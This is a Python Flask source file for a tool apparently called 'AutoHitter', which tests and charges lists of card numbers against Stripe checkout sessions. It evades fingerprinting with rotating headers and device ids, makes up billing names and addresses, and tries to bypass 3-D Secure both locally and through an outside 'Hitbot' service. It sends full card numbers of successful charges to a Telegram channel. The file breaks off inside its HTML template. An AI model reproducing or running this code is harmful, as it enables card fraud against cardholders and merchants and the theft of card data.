from flask import Flask, render_template_string, request, jsonify
import requests
import re
import os
import asyncio
import aiohttp
import base64
import time
import random
import logging
import traceback
import json
from logging.handlers import RotatingFileHandler
from datetime import datetime
from urllib.parse import unquote, urlparse, parse_qs, urlencode
from functools import wraps
from typing import Dict, Optional, Tuple, List

from stripe_3ds import Stripe3DSBypass
from hitbot_wrapper import HitbotAPI

# Setup logging
LOG_DIR = 'logs'
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

logger = logging.getLogger('autohitter')
logger.setLevel(logging.DEBUG)

file_handler = RotatingFileHandler(
    f'{LOG_DIR}/autohitter.log',
    maxBytes=10*1024*1024,
    backupCount=5
)
file_handler.setLevel(logging.DEBUG)

console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)

formatter = logging.Formatter(
    '%(asctime)s | %(levelname)-8s | %(name)s | %(funcName)s:%(lineno)d | %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
file_handler.setFormatter(formatter)
console_handler.setFormatter(formatter)

logger.addHandler(file_handler)
logger.addHandler(console_handler)

card_logger = logging.getLogger('cards')
card_logger.setLevel(logging.INFO)
card_handler = RotatingFileHandler(
    f'{LOG_DIR}/cards.log',
    maxBytes=10*1024*1024,
    backupCount=5
)
card_handler.setFormatter(logging.Formatter('%(asctime)s | %(message)s', datefmt='%Y-%m-%d %H:%M:%S'))
card_logger.addHandler(card_handler)
card_logger.propagate = False

error_logger = logging.getLogger('errors')
error_logger.setLevel(logging.ERROR)
error_handler = RotatingFileHandler(
    f'{LOG_DIR}/errors.log',
    maxBytes=10*1024*1024,
    backupCount=5
)
error_handler.setFormatter(formatter)
error_logger.addHandler(error_handler)
error_logger.propagate = False

app = Flask(__name__)

logger.info("=" * 60)
logger.info("AutoHitter v5.0 — Hitbot API Integration + Local 3DS Bypass")
logger.info("=" * 60)

# Rotating user agents for fingerprint evasion
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
]

SEC_CH_UA = [
    '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    '"Not_A Brand";v="8", "Chromium";v="119", "Google Chrome";v="119"',
    '"Not_A Brand";v="8", "Chromium";v="118", "Google Chrome";v="118"',
]

def get_random_headers():
    ua = random.choice(USER_AGENTS)
    sec = random.choice(SEC_CH_UA)
    return {
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://checkout.stripe.com",
        "referer": "https://checkout.stripe.com/",
        "user-agent": ua,
        "sec-ch-ua": sec,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"' if "Windows" in ua else '"macOS"' if "Macintosh" in ua else '"Linux"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site"
    }


def log_error(func_name, error, details=None):
    error_msg = f"ERROR in {func_name}: {str(error)}"
    if details:
        error_msg += f" | Details: {details}"
    error_logger.error(error_msg)
    error_logger.error(traceback.format_exc())


def retry_on_failure(max_retries=3, delay=1, backoff=2):
    def decorator(func):
        @wraps(func)
        async def wrapper(*args, **kwargs):
            retries = 0
            while retries < max_retries:
                try:
                    return await func(*args, **kwargs)
                except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                    retries += 1
                    wait_time = delay * (backoff ** (retries - 1))
                    logger.warning(f"Retry {retries}/{max_retries} for {func.__name__} after {wait_time}s: {str(e)}")
                    if retries == max_retries:
                        logger.error(f"Max retries reached for {func.__name__}")
                        raise
                    await asyncio.sleep(wait_time + random.uniform(0, 0.5))
            return None
        return wrapper
    return decorator


def extract_checkout_url(text):
    patterns = [
        r'https?://checkout\.stripe\.com/c/pay/cs_[^\s"\'\<\>\)]+',
        r'https?://checkout\.stripe\.com/[^\s"\'\<\>\)]+',
        r'https?://buy\.stripe\.com/[^\s"\'\<\>\)]+',
    ]
    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            url = m.group(0).rstrip('.,;:')
            logger.debug(f"Extracted checkout URL: {url[:50]}...")
            return url
    logger.warning(f"No checkout URL found in text: {text[:100]}...")
    return None


def decode_pk_from_url(url):
    result = {"pk": None, "cs": None}
    try:
        cs_match = re.search(r'cs_(live|test)_[A-Za-z0-9]+', url)
        if cs_match:
            result["cs"] = cs_match.group(0)
        else:
            logger.warning("No CS token found in URL")

        if '#' in url:
            hash_part = url.split('#')[1]
            hash_decoded = unquote(hash_part)
            try:
                decoded_bytes = base64.b64decode(hash_decoded)
                xored = ''.join(chr(b ^ 5) for b in decoded_bytes)
                pk_match = re.search(r'pk_(live|test)_[A-Za-z0-9]+', xored)
                if pk_match:
                    result["pk"] = pk_match.group(0)
            except Exception as e:
                logger.warning(f"Failed to decode PK from URL hash: {str(e)}")
    except Exception as e:
        log_error("decode_pk_from_url", e, f"URL: {url[:50]}...")
    return result


def parse_card_autohitter(text):
    text = text.strip()
    parts = re.split(r'[|:/\\\-\s]+', text)
    if len(parts) < 4:
        logger.warning(f"Card parse failed - not enough parts: {text[:20]}...")
        return None

    cc = re.sub(r'\D', '', parts[0])
    if not (15 <= len(cc) <= 19):
        logger.warning(f"Invalid CC length: {len(cc)} digits")
        return None

    month = parts[1].strip()
    if len(month) == 1:
        month = f"0{month}"
    if not (len(month) == 2 and month.isdigit() and 1 <= int(month) <= 12):
        logger.warning(f"Invalid month: {month}")
        return None

    year = parts[2].strip()
    if len(year) == 4:
        year = year[2:]
    if len(year) != 2:
        logger.warning(f"Invalid year: {year}")
        return None

    cvv = re.sub(r'\D', '', parts[3])
    if not (3 <= len(cvv) <= 4):
        logger.warning(f"Invalid CVV length: {len(cvv)}")
        return None

    card = {"cc": cc, "month": month, "year": year, "cvv": cvv}
    logger.debug(f"Parsed card: {cc[:6]}******{cc[-4:]}")
    return card


@retry_on_failure(max_retries=3, delay=1)
async def get_checkout_info_async(url):
    result = {"pk": None, "cs": None, "merchant": None, "price": None, "currency": None, "init_data": None, "error": None}
    try:
        decoded = decode_pk_from_url(url)
        result["pk"] = decoded.get("pk")
        result["cs"] = decoded.get("cs")

        if not result["pk"] or not result["cs"]:
            result["error"] = "Could not decode PK/CS from URL"
            logger.error(f"Checkout init failed: {result['error']}")
            return result

        logger.info(f"Initializing checkout for CS: {result['cs'][:20]}...")

        async with aiohttp.ClientSession() as session:
            body = f"key={result['pk']}&eid=NA&browser_locale=en-US&redirect_type=url"

            async with session.post(
                f"https://api.stripe.com/v1/payment_pages/{result['cs']}/init",
                headers=get_random_headers(),
                data=body,
                timeout=aiohttp.ClientTimeout(total=30)
            ) as r:
                init_data = await r.json()

            if "error" not in init_data:
                result["init_data"] = init_data
                acc = init_data.get("account_settings", {})
                result["merchant"] = acc.get("display_name") or acc.get("business_name")
                result["email"] = init_data.get("customer_email") or init_data.get("customer", {}).get("email") or "N/A"

                lig = init_data.get("line_item_group")
                inv = init_data.get("invoice")
                if lig:
                    result["price"] = lig.get("total", 0) / 100
                    result["currency"] = lig.get("currency", "").upper()
                elif inv:
                    result["price"] = inv.get("total", 0) / 100
                    result["currency"] = inv.get("currency", "").upper()

                logger.info(f"Checkout loaded: {result['merchant']} | {result['currency']} {result['price']}")
            else:
                result["error"] = init_data.get("error", {}).get("message", "Init failed")
                logger.error(f"Stripe init error: {result['error']}")

    except asyncio.TimeoutError:
        result["error"] = "Request timeout"
        logger.error(f"Timeout getting checkout info for {url[:50]}...")
    except aiohttp.ClientError as e:
        result["error"] = f"Network error: {str(e)}"
        logger.error(f"Network error: {str(e)}")
    except Exception as e:
        result["error"] = str(e)
        log_error("get_checkout_info_async", e)

    return result


async def create_fresh_checkout_session(pk, original_cs, proxy=None):
    """
    Create a fresh checkout session for each card to get a unique PI.
    This avoids the 'PM previously used' error by giving each card its own PI.
    """
    try:
        connector = None
        if proxy:
            try:
                proxy_parts = proxy.split(':')
                if len(proxy_parts) == 4:
                    proxy_url = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
                elif len(proxy_parts) == 2:
                    proxy_url = f"http://{proxy_parts[0]}:{proxy_parts[1]}"
                else:
                    proxy_url = proxy
                connector = aiohttp.TCPConnector(ssl=False)
            except:
                pass

        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(
            timeout=timeout,
            connector=connector or aiohttp.TCPConnector(ssl=False)
        ) as session:
            # First, get the original checkout session details
            headers = get_random_headers()
            
            # Try to create a new checkout session by calling the init endpoint
            # with a fresh eid (device fingerprint)
            eid = f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}"
            body = f"key={pk}&eid={eid}&browser_locale=en-US&redirect_type=url"

            async with session.post(
                f"https://api.stripe.com/v1/payment_pages/{original_cs}/init",
                headers=headers,
                data=body,
                timeout=aiohttp.ClientTimeout(total=30)
            ) as r:
                init_data = await r.json()

            if "error" in init_data:
                logger.warning(f"Fresh session creation failed: {init_data['error']}")
                return None

            # The init should return a new checkout session
            new_cs = init_data.get("id") or original_cs
            logger.debug(f"Fresh checkout session: {new_cs[:20]}...")
            
            return {
                "cs": new_cs,
                "init_data": init_data,
                "init_checksum": init_data.get("init_checksum", "")
            }

    except Exception as e:
        logger.error(f"Error creating fresh session: {e}")
        return None


async def charge_card_with_3ds(card, checkout_data, proxy=None):
    """
    Charge card with integrated 3DS bypass using SAME session throughout.
    v4.2 — Creates FRESH checkout session per card to avoid PM reuse on same PI.
    """
    start = time.perf_counter()
    card_masked = f"{card['cc'][:6]}******{card['cc'][-4:]}"
    result = {
        "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
        "status": None,
        "response": None,
        "time": 0,
        "bin_info": None
    }

    pk = checkout_data.get("pk")
    original_cs = checkout_data.get("cs")
    init_data = checkout_data.get("init_data")

    if not pk or not original_cs or not init_data:
        result["status"] = "FAILED"
        result["response"] = "No checkout data"
        result["time"] = round(time.perf_counter() - start, 2)
        return result

    # Build connector for proxy if needed
    connector = None
    if proxy:
        try:
            proxy_parts = proxy.split(':')
            if len(proxy_parts) == 4:
                proxy_url = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
            elif len(proxy_parts) == 2:
                proxy_url = f"http://{proxy_parts[0]}:{proxy_parts[1]}"
            else:
                proxy_url = proxy
            connector = aiohttp.TCPConnector(ssl=False)
            logger.debug(f"Using proxy for {card_masked}")
        except Exception as e:
            logger.warning(f"Proxy parse error: {e}")

    session = None
    try:
        timeout = aiohttp.ClientTimeout(total=90)
        session = aiohttp.ClientSession(
            timeout=timeout,
            connector=connector or aiohttp.TCPConnector(ssl=False),
            cookie_jar=aiohttp.CookieJar()
        )

        # CRITICAL: Create a FRESH checkout session for this card
        # This gives us a unique PI per card, avoiding "PM previously used" errors
        logger.info(f"Creating fresh checkout session for {card_masked}...")
        fresh_session = await create_fresh_checkout_session(pk, original_cs, proxy)
        
        if fresh_session and fresh_session.get("cs"):
            cs = fresh_session["cs"]
            init_data = fresh_session["init_data"]
            checksum = fresh_session["init_checksum"]
            logger.info(f"Fresh session created: {cs[:20]}...")
        else:
            # Fallback to original session
            cs = original_cs
            checksum = init_data.get("init_checksum", "")
            logger.warning(f"Using original session (fresh session creation failed)")

        # Get rotating headers for fingerprint evasion
        headers = get_random_headers()
        token_headers = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "user-agent": headers["user-agent"]
        }

        email = init_data.get("customer_email") or f"user{random.randint(10000,99999)}@gmail.com"

        lig = init_data.get("line_item_group")
        inv = init_data.get("invoice")
        if lig:
            total, subtotal = lig.get("total", 0), lig.get("subtotal", 0)
        elif inv:
            total, subtotal = inv.get("total", 0), inv.get("subtotal", 0)
        else:
            pi = init_data.get("payment_intent") or {}
            total = subtotal = pi.get("amount", 0)

        cust = init_data.get("customer") or {}
        addr = cust.get("address") or {}
        name = cust.get("name") or f"John Smith{random.randint(1,99)}"
        country = addr.get("country") or "US"
        line1 = addr.get("line1") or f"{random.randint(100,9999)} {random.choice(['Main','Oak','Pine','Elm'])} St"
        city = addr.get("city") or random.choice(["Pinetop","Springfield","Riverside","Fairview"])
        state = addr.get("state") or random.choice(["AZ","CA","TX","NY","FL"])
        zip_code = addr.get("postal_code") or f"{random.randint(10000,99999)}"

        # Customer creation skipped (requires secret key)
        customer_id = None
        logger.debug(f"Using publishable key only — no Customer creation")

        # Step 1: Create token
        logger.debug(f"Creating token for {card_masked}")
        token_body = (
            f"card[number]={card['cc']}&card[cvc]={card['cvv']}&card[exp_month]={card['month']}"
            f"&card[exp_year]={card['year']}&card[name]={name}&card[address_country]={country}"
            f"&card[address_line1]={line1}&card[address_city]={city}&card[address_state]={state}"
            f"&card[address_zip]={zip_code}&key={pk}&pasted_fields=number"
            f"&payment_user_agent=stripe.js%2Fb3f6c00c8a%3B+stripe-js-v3%2Fb3f6c00c8a%3B+checkout"
            f"&referrer=https%3A%2F%2Fcheckout.stripe.com&time_on_page={random.randint(15000, 45000)}"
        )

        async with session.post(
            "https://api.stripe.com/v1/tokens",
            headers=token_headers,
            data=token_body,
            timeout=aiohttp.ClientTimeout(total=30)
        ) as r:
            tok = await r.json()

        if "error" in tok:
            result["status"] = "DECLINED"
            result["response"] = tok["error"].get("message", "Card error")
            result["time"] = round(time.perf_counter() - start, 2)
            card_logger.info(f"DECLINED | {card_masked} | {result['response']} | {result['time']}s")
            return result

        token_id = tok.get("id")
        if not token_id:
            result["status"] = "FAILED"
            result["response"] = "No Token"
            result["time"] = round(time.perf_counter() - start, 2)
            return result

        logger.debug(f"Token created: {token_id[:20]}...")

        # Step 2: Create payment method
        pm_body = (
            f"type=card&card[token]={token_id}&billing_details[name]={name}"
            f"&billing_details[email]={email}&billing_details[address][country]={country}"
            f"&billing_details[address][line1]={line1}&billing_details[address][city]={city}"
            f"&billing_details[address][postal_code]={zip_code}&billing_details[address][state]={state}&key={pk}"
        )

        async with session.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=headers,
            data=pm_body,
            timeout=aiohttp.ClientTimeout(total=30)
        ) as r:
            pm = await r.json()

        if "error" in pm:
            result["status"] = "DECLINED"
            result["response"] = pm["error"].get("message", "Card error")
            result["time"] = round(time.perf_counter() - start, 2)
            card_logger.info(f"DECLINED | {card_masked} | {result['response']} | {result['time']}s")
            return result

        pm_id = pm.get("id")
        if not pm_id:
            result["status"] = "FAILED"
            result["response"] = "No PM"
            result["time"] = round(time.perf_counter() - start, 2)
            return result

        logger.debug(f"Payment method created: {pm_id[:20]}...")

        # Step 3: Confirm payment (PM used ONCE — no Customer attachment possible with pk only)
        conf_body = (
            f"eid=NA&payment_method={pm_id}&expected_amount={total}"
            f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
            f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
            f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
            f"&last_displayed_line_item_group_details[total_discount_amount]=0"
            f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
            f"&expected_payment_method_type=card&key={pk}&init_checksum={checksum}"
        )

        async with session.post(
            f"https://api.stripe.com/v1/payment_pages/{cs}/confirm",
            headers=headers,
            data=conf_body,
            timeout=aiohttp.ClientTimeout(total=30)
        ) as r:
            conf = await r.json()

        if "error" in conf:
            err = conf["error"]
            dc = err.get("decline_code", "")
            msg = err.get("message", "Failed")
            result["status"] = "DECLINED"
            result["response"] = f"{dc.upper()}: {msg}" if dc else msg
            result["time"] = round(time.perf_counter() - start, 2)
            card_logger.info(f"DECLINED | {card_masked} | {result['response']} | {result['time']}s")
            return result

        pi = conf.get("payment_intent") or {}
        st = pi.get("status", "") or conf.get("status", "")
        pi_id = pi.get("id", "")
        pi_cs = pi.get("client_secret", "")

        if st == "succeeded":
            result["status"] = "CHARGED"
            result["response"] = "Payment Successful"
            result["time"] = round(time.perf_counter() - start, 2)
            card_logger.info(f"CHARGED | {card_masked} | {result['response']} | {result['time']}s")
            logger.info(f"SUCCESS! Card {card_masked} charged successfully")

        elif st == "requires_action":
            next_action = pi.get("next_action") or conf.get("next_action") or {}
            redirect_info = next_action.get("redirect_to_url") or {}
            redirect_url = redirect_info.get("url", "")

            logger.info(f"3DS required for {card_masked}, attempting bypass with SAME session...")

            # FIXED: Use SAME session + Checkout API for 3DS bypass!
            bypass = Stripe3DSBypass(session, pk)
            bypass_result = await bypass.bypass(
                redirect_url=redirect_url,
                pi_id=pi_id,
                pi_client_secret=pi_cs,
                cs=cs,
                pm_id=pm_id,
                checksum=checksum,
                total=total,
                subtotal=subtotal,
                customer_id=customer_id
            )

            result["time"] = round(time.perf_counter() - start, 2)

            if bypass_result["success"]:
                result["status"] = "CHARGED"
                result["response"] = "3DS Bypass Successful"
                card_logger.info(f"CHARGED | {card_masked} | 3DS Bypass | {result['time']}s")
                logger.info(f"3DS bypass SUCCESS for {card_masked}!")
            else:
                err_msg = bypass_result.get("error", "3DS bypass failed")
                result["status"] = "DECLINED"
                result["response"] = f"3DS Failed: {err_msg}"
                card_logger.info(f"DECLINED | {card_masked} | {result['response']} | {result['time']}s")
                logger.warning(f"3DS bypass failed for {card_masked}: {err_msg}")

        elif st == "requires_payment_method":
            result["status"] = "DECLINED"
            result["response"] = "Card Declined"
            result["time"] = round(time.perf_counter() - start, 2)
            card_logger.info(f"DECLINED | {card_masked} | {result['response']} | {result['time']}s")
        else:
            result["status"] = "UNKNOWN"
            result["response"] = st or "Unknown"
            result["time"] = round(time.perf_counter() - start, 2)
            logger.warning(f"Unknown status for {card_masked}: {st}")

    except asyncio.TimeoutError:
        result["status"] = "ERROR"
        result["response"] = "Request timeout"
        result["time"] = round(time.perf_counter() - start, 2)
        logger.error(f"Timeout charging card {card_masked}")
        card_logger.error(f"ERROR | {card_masked} | Timeout | {result['time']}s")

    except aiohttp.ClientError as e:
        result["status"] = "ERROR"
        result["response"] = f"Network error: {str(e)[:50]}"
        result["time"] = round(time.perf_counter() - start, 2)
        logger.error(f"Network error for {card_masked}: {str(e)[:50]}")
        card_logger.error(f"ERROR | {card_masked} | {result['response']} | {result['time']}s")

    except Exception as e:
        result["status"] = "ERROR"
        result["response"] = f"Error: {str(e)[:50]}"
        result["time"] = round(time.perf_counter() - start, 2)
        log_error("charge_card_with_3ds", e, f"Card: {card_masked}")
        card_logger.error(f"ERROR | {card_masked} | {result['response']} | {result['time']}s")

    finally:
        if session:
            await session.close()

    return result


async def charge_card_with_hitbot(card: dict, checkout_data: dict, proxy: str = None) -> dict:
    """
    Charge a card using the Hitbot API (external 3DS bypass service)
    
    Args:
        card: Dict with cc, month, year, cvv
        checkout_data: Dict with checkout_url, cs, pk, etc.
        proxy: Optional proxy string
    
    Returns:
        dict with status, response, time, etc.
    """
    start = time.perf_counter()
    cc = card.get("cc", "")
    card_masked = f"{cc[:6]}******{cc[-4:]}"
    
    result = {
        "card": cc,
        "status": "FAILED",
        "response": "",
        "time": 0,
        "bin_info": None
    }
    
    checkout_url = checkout_data.get("checkout_url", "")
    if not checkout_url:
        result["status"] = "ERROR"
        result["response"] = "No checkout URL"
        result["time"] = round(time.perf_counter() - start, 2)
        return result
    
    # Format card for hitbot API: num|mm|yy|cvv
    hitbot_cc = f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}"
    
    logger.info(f"Using Hitbot API for {card_masked}...")
    
    try:
        async with HitbotAPI() as api:
            api_result = await api.charge_card(checkout_url, hitbot_cc, proxy)
        
        elapsed = api_result.get("elapsed_seconds", "0")
        if isinstance(elapsed, str):
            try:
                elapsed = float(elapsed)
            except:
                elapsed = round(time.perf_counter() - start, 2)
        
        result["time"] = elapsed
        
        # Map hitbot status to our status
        status = api_result.get("status", "unknown")
        message = api_result.get("message", "No message")
        is_charged = api_result.get("charged", False)
        is_live = api_result.get("live", False)
        
        # Check 3DS info
        three_ds = api_result.get("3ds", {})
        ds_attempted = three_ds.get("attempted", False)
        ds_bypassed = three_ds.get("bypassed", False)
        ds_state = three_ds.get("state", "")
        
        if is_charged:
            result["status"] = "CHARGED"
            result["response"] = f"Payment Successful (Hitbot)"
            card_logger.info(f"CHARGED | {card_masked} | Hitbot API | {elapsed}s")
            logger.info(f"Hitbot CHARGED {card_masked}!")
        
        elif is_live:
            # Card is live but not charged (e.g., incorrect CVC)
            result["status"] = "DECLINED"
            result["response"] = f"Live Card: {message}"
            card_logger.info(f"DECLINED | {card_masked} | Live: {message} | {elapsed}s")
            logger.info(f"Hitbot live card {card_masked}: {message}")
        
        elif ds_bypassed and not is_charged:
            # 3DS bypassed but payment failed (card issue, not 3DS issue)
            result["status"] = "DECLINED"
            result["response"] = f"3DS Bypassed: {message}"
            card_logger.info(f"DECLINED | {card_masked} | 3DS OK: {message} | {elapsed}s")
            logger.info(f"Hitbot 3DS bypassed for {card_masked}: {message}")
        
        elif status == "dead":
            result["status"] = "DECLINED"
            result["response"] = f"Dead: {message}"
            card_logger.info(f"DECLINED | {card_masked} | Dead: {message} | {elapsed}s")
        
        elif status == "timeout":
            result["status"] = "ERROR"
            result["response"] = f"Timeout: {message}"
            card_logger.error(f"ERROR | {card_masked} | Timeout | {elapsed}s")
        
        else:
            result["status"] = "DECLINED"
            result["response"] = f"{status}: {message}"
            card_logger.info(f"DECLINED | {card_masked} | {status}: {message} | {elapsed}s")
        
        # Log 3DS info
        if ds_attempted:
            logger.info(f"Hitbot 3DS for {card_masked}: attempted={ds_attempted}, bypassed={ds_bypassed}, state={ds_state}")
        
    except Exception as e:
        result["status"] = "ERROR"
        result["response"] = f"Hitbot error: {str(e)[:50]}"
        result["time"] = round(time.perf_counter() - start, 2)
        log_error("charge_card_with_hitbot", e, f"Card: {card_masked}")
        card_logger.error(f"ERROR | {card_masked} | Hitbot: {str(e)[:50]} | {result['time']}s")
    
    return result


TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
TELEGRAM_CHAT_ID = "@xaclly"


def get_bin_info(cc):
    try:
        bin_number = cc.split('|')[0][:6]
        logger.debug(f"Looking up BIN: {bin_number}")

        resp = requests.get(
            f"https://bins.antipublic.cc/bins/{bin_number}",
            timeout=10
        )

        if resp.status_code == 200:
            data = resp.json()
            return {
                'bin': bin_number,
                'brand': data.get('brand', 'N/A'),
                'type': data.get('type', 'N/A'),
                'level': data.get('level', 'N/A'),
                'bank': data.get('bank', 'N/A'),
                'country': data.get('country_name', 'N/A'),
                'country_flag': data.get('country_flag', '')
            }
        else:
            logger.warning(f"BIN lookup failed with status {resp.status_code}")

    except requests.Timeout:
        logger.warning(f"BIN lookup timeout for {cc[:6]}")
    except Exception as e:
        log_error("get_bin_info", e, f"BIN: {cc[:6]}")

    return None


def send_telegram_autohitter(cc, response, bin_info, merchant, price, email, checkout_url, tried_cards=None):
    if not TELEGRAM_BOT_TOKEN:
        logger.warning("Telegram bot token not configured, skipping notification")
        return False

    try:
        bin_brand = bin_info.get('brand', 'N/A') if bin_info else 'N/A'
        bin_type = bin_info.get('type', 'N/A') if bin_info else 'N/A'
        bin_level = bin_info.get('level', 'N/A') if bin_info else 'N/A'
        bin_bank = bin_info.get('bank', 'N/A') if bin_info else 'N/A'
        bin_country = bin_info.get('country', 'N/A') if bin_info else 'N/A'
        bin_flag = bin_info.get('country_flag', '') if bin_info else ''

        tried_list = ""
        if tried_cards and len(tried_cards) > 0:
            tried_list = "\n".join([f"• {c}" for c in tried_cards])

        message = f"""━━━━━━━━━━━━━━━
💠 𝐏𝐀𝐘𝐌𝐄𝐍𝐓 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 💠
━━━━━━━━━━━━━━━

💳 𝐂𝐚𝐫𝐝  : {cc}
🔥 𝐒𝐭𝐚𝐭𝐮𝐬 : Paid
💰 𝐀𝐦𝐨𝐮𝐧𝐭 : {price}
🌐 𝐒𝐢𝐭𝐞   : {merchant}
📩 𝐌𝐚𝐢𝐥  : {email}

📦 𝐈𝐧𝐟𝐨  : {bin_brand} - {bin_type} - {bin_level}
🏦 𝐁𝐚𝐧𝐤  : {bin_bank}
🌍 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_country} {bin_flag}

🔗 𝐂𝐨𝐧𝐟𝐢𝐫𝐦 :
{checkout_url}

🙏 Thank you!
━━━━━━━━━━━━━━━
👤 𝐃𝐞𝐯 : Zangi
━━━━━━━━━━━━━
📋 𝐀𝐥𝐥 𝐓𝐫𝐢𝐞𝐝 𝐂𝐚𝐫𝐝𝐬 ({len(tried_cards) if tried_cards else 0}):
{tried_list}"""

        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"

        logger.info(f"Sending Telegram notification for charged card: {cc[:6]}******{cc[-4:]}")

        resp = requests.post(
            url,
            json={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": message,
                "disable_web_page_preview": True
            },
            timeout=15
        )

        if resp.status_code == 200:
            logger.info("Telegram notification sent successfully")
            return True
        else:
            logger.error(f"Telegram API error: {resp.status_code} - {resp.text[:100]}")
            return False

    except requests.Timeout:
        logger.error("Telegram notification timeout")
        return False
    except Exception as e:
        log_error("send_telegram_autohitter", e)
        return False


HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>UNOOC-2026</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔐</text></svg>">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(145deg, #0a0a0f 0%, #12121a 50%, #0a0a0f 100%);
            min-height: 100vh;
            padding: 20px;
            color: #d0d0d8;
            position: relative;
            overflow-x: hidden;
        }
        body::before {
            content: '';
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background:
                radial-gradient(ellipse at 20% 0%, rgba(90, 100, 130, 0.08) 0%, transparent 50%),
                radial-gradient(ellipse at 80% 100%, rgba(70, 80, 110, 0.06) 0%, transparent 50%);
            pointer-events: none; z-index: 0;
        }
        .container { max-width: 1200px; margin: 0 auto; position: relative; z-index: 1; }
        h1 { color: #a0b0c8; text-align: center; margin-bottom: 30px; font-weight: 700; font-size: 36px; letter-spacing: 3px; }
        .input-section {
            background: rgba(25, 28, 38, 0.85);
            border-radius: 16px;
            padding: 25px;
            margin-bottom: 20px;
            border: 1px solid rgba(100, 120, 150, 0.25);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }
        .input-section:hover { border-color: rgba(100, 120, 150, 0.4); }
        label { display: block; color: #8090a8; margin-bottom: 10px; font-weight: 500; font-size: 13px; letter-spacing: 1px; text-transform: uppercase; }
        textarea {
            width: 100%; padding: 16px;
            background: rgba(15, 18, 25, 0.9);
            border: 1px solid rgba(80, 100, 130, 0.3);
            border-radius: 12px; color: #d0d0d8;
            font-size: 14px; font-family: 'Courier New', monospace;
            resize: vertical; min-height: 120px;
            transition: border-color 0.2s ease;
        }
        textarea:focus { outline: none; border-color: rgba(100, 130, 170, 0.5); }
        textarea::placeholder { color: #505868; }
        select {
            width: 100%; padding: 12px 15px; background: #0f1419;
            border: 1px solid #1e2530; border-radius: 8px;
            color: #c0c8d8; font-size: 14px; cursor: pointer;
            font-family: 'Poppins', sans-serif;
            transition: border-color 0.2s ease;
            appearance: none;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%238090a8' d='M6 8L1 3h10z'/%3E%3C/svg%3E");
            background-repeat: no-repeat;
            background-position: right 15px center;
            padding-right: 40px;
        }
        select:focus { outline: none; border-color: rgba(100, 130, 170, 0.5); }
        select:hover { border-color: rgba(100, 130, 170, 0.3); }
        option { background: #0f1419; color: #c0c8d8; }
        .btn-row { display: flex; gap: 15px; margin-top: 25px; flex-wrap: wrap; }
        button {
            padding: 14px 28px; border: none; border-radius: 12px;
            font-size: 14px; font-weight: 600; cursor: pointer;
            transition: background 0.2s ease, transform 0.15s ease;
            text-transform: uppercase; letter-spacing: 1.5px;
            font-family: 'Poppins', sans-serif;
        }
        button:active { transform: scale(0.98); }
        .btn-primary { background: #4a5568; color: #fff; flex: 1; min-width: 150px; border: 1px solid rgba(100, 120, 150, 0.3); }
        .btn-primary:hover { background: #5a6578; }
        .btn-danger { background: #553030; color: #fff; border: 1px solid rgba(180, 80, 80, 0.3); }
        .btn-danger:hover { background: #653838; }
        .btn-secondary { background: rgba(30, 35, 45, 0.8); color: #8090a8; border: 1px solid rgba(80, 100, 130, 0.4); }
        .btn-secondary:hover { border-color: rgba(100, 130, 170, 0.5); color: #a0b0c8; }
        .results-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 25px; margin-top: 25px; }
        @media (max-width: 768px) { .results-grid { grid-template-columns: 1fr; } }
        .result-box {
            background: rgba(25, 28, 38, 0.85);
